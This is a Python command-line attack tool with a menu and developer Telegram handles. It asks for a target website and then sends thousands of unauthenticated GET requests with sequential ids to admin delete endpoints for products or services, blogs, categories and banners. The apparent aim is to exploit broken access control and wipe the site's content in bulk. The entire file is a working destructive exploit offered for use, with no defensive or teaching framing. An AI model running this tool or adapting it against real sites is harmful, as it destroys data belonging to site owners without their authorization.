import requests
from tqdm import tqdm
import urllib

from colorama import Fore, Back, Style

print("""\033[1;31m

            dMP    dMP dMP .aMMMb  dMP dMMMMMP dMMMMMP dMMMMb 
           dMP    dMP dMP dMP"VMP amr dMP     dMP     dMP.dMP 
          dMP    dMP dMP dMP     dMP dMMMP   dMMMP   dMMMMK"  
         dMP    dMP.aMP dMP.aMP dMP dMP     dMP     dMP"AMF   
        dMMMMMP VMMMP"  VMMMP" dMP dMP     dMMMMMP dMP dMP""")
print(Fore.LIGHTWHITE_EX+"""
+------------------------------------------------------------------+
|                   Delete Content Automatically           vs: 1.0 |
+------------------------------------------------------------------+
| Dev: er4vn , baran silvermoon     Telegram: @er4vnn , @need_boob |
+------------------------------------------------------------------+           

\033[1;31m[1] \033[1;37mDelete Services           \033[1;31m[2] \033[1;37mDelete Blog       

\033[1;31m[3] \033[1;37mDelete Category           \033[1;31m[4] \033[1;37mDelete Banner
""")
options = input('enter your options > ')
if options  == "1":
  
  target1 = input("url > ")
  number = int(input("enter your number request (1-50000) > "))
  print('\n')

  url1 = (target1+"admin/delet-product.php?id=")

  for a in tqdm(range(1,number),"\033[1;31m"+'start attack'):
      
    attack1 = (url1+str(a))

    send1 = requests.get(attack1)

  print(Fore.LIGHTWHITE_EX+"\n"+"deleted successfully")

elif options == "2":
  target2 = input("url > ")
  number = int(input("enter your number request (1-50000) > "))
  print('\n')

  url2 = (target2+"admin/delet-blog.php?id=")

  for b in tqdm(range(1,number),desc="\033[1;31m"+'start attack'):
      
    attack2 = (url2+str(b))

    send2 = requests.get(attack2)

  print(Fore.LIGHTWHITE_EX+"\n"+"deleted successfully")

elif options == "3":
  target3 = input("url > ")
  number = int(input("enter your number request (1-50000) > "))
  print('\n')

  url3 = (target3+"admin/delete-categ.php?id=")

  for c in tqdm(range(1,number),desc="\033[1;31m"+'start attack'):
      
    attack3 = (url3+str(c))

    send3 = requests.get(attack3)

  print(Fore.LIGHTWHITE_EX+"\n"+"deleted successfully")

elif options == "4":
  target4 = input("url > ")
  number = int(input("enter your number request (1-50000) > "))
  print('\n')

  url4 = (target4+"admin/delet-banner.php?id=")

  for d in tqdm(range(1,number),desc="\033[1;31m"+'start attack'):
      
    attack4 = (url4+str(d))

    send4 = requests.get(attack4)

  print(Fore.LIGHTWHITE_EX+"\n"+"deleted successfully")

else:
  print("Try again")

        
   